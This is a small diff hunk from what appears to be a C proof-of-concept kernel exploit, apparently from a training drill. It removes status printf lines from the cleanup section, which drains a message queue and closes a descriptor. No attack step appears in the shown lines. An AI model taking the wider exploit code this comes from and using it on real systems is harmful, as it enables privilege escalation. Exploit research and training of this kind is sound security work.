@@ -350,21 +350,17 @@ int main(void)
 	*/
 
 end:
-	printf("[!] finishing this PoC exploit\n");
-
 	for (i = 0; ; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
 		if (bytes == -1) {
 			break;
 		}
 	}
-	printf("  cleaned the message queue: received %ld normal messages\n", i);
 
 	if (act_fd >= 0) {
 		ret = close(act_fd);
 		if (ret != 0)
 			perror("[-] close act_fd");
-		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
